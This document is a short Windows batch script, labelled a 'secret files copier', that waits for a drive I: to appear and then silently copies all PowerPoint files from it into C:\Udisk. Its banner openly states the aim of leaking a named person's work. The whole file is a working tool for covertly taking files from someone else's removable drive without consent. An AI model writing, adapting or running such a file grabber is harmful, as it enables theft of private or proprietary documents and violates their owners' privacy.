@echo off
title UNIVERSAL SECRET FILES COPIER VERSION 1.0
color 0a
echo.
echo UNIVERSAL SECRET FILES COPIER VERSION 1.0 BETA1 BUILD 20151027
echo.
echo Shhh...Let's leak Herr Song's hard work!
echo.
echo Log Window:

:main
echo Scanning disk volume I:\...
if exist I: goto detect
echo Disk volume I:\ not exist!
goto repeat

:detect
if exist C:\Udisk goto copy
md C:\Udisk
goto copy

:copy
echo Copying..
copy I:\*.ppt C:\Udisk
copy I:\*.pptx C:\Udisk
if errorlevel==1 goto repeat2
goto end

:repeat
echo Retry in 5 seconds...
ping /n 5 127.1 >nul
goto main

:repeat2
echo Retry because of copy failure...
goto repeat

:end
pause
exit
